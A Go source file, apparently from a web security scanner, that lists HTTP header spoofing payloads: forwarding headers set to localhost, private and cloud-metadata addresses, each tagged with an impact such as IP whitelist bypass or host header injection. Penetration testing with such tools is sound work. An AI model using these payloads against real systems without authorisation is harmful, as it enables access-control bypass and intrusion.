package headers

import "github.com/cc1a2b/jshunter/engine"

func GetProxyMutations() []engine.Mutation {
	return []engine.Mutation{
		{Header: "X-Forwarded-For", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Forwarded-For", Value: "::1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Forwarded-For", Value: "localhost", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Forwarded-For", Value: "0.0.0.0", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Forwarded-For", Value: "169.254.169.254", Category: "Proxy", Impact: "Cloud Metadata Access"},
		{Header: "X-Forwarded-For", Value: "10.0.0.1", Category: "Proxy", Impact: "Internal Network Access"},
		{Header: "X-Forwarded-For", Value: "192.168.1.1", Category: "Proxy", Impact: "Internal Network Access"},
		{Header: "X-Real-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Real-IP", Value: "::1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Real-IP", Value: "169.254.169.254", Category: "Proxy", Impact: "Cloud Metadata Access"},
		{Header: "X-Real-IP", Value: "10.0.0.1", Category: "Proxy", Impact: "Internal Network Access"},
		{Header: "X-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Client-IP", Value: "::1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Client-IP", Value: "169.254.169.254", Category: "Proxy", Impact: "Cloud Metadata Access"},
		{Header: "X-Originating-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Remote-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Remote-Addr", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "Forwarded", Value: "for=127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "Forwarded", Value: "for=127.0.0.1;proto=https", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "Forwarded", Value: "for=::1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-ProxyUser-Ip", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "True-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Cluster-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass"},
		{Header: "X-Host", Value: "localhost", Category: "Proxy", Impact: "Host Header Injection"},
		{Header: "X-Forwarded-Host", Value: "localhost", Category: "Proxy", Impact: "Host Header Injection"},
		{Header: "X-Forwarded-Server", Value: "localhost", Category: "Proxy", Impact: "Server Spoofing"},
		{Header: "X-Original-Host", Value: "localhost", Category: "Proxy", Impact: "Host Header Injection"},
		{Header: "X-Forwarded-Proto", Value: "https", Category: "Proxy", Impact: "Protocol Confusion"},
		{Header: "X-Forwarded-Scheme", Value: "https", Category: "Proxy", Impact: "Protocol Confusion"},
		{Header: "X-Forwarded-Ssl", Value: "on", Category: "Proxy", Impact: "SSL Bypass"},
		{Header: "Front-End-Https", Value: "on", Category: "Proxy", Impact: "SSL Bypass"},
		{Header: "X-Url-Scheme", Value: "https", Category: "Proxy", Impact: "Protocol Confusion"},
	}
}
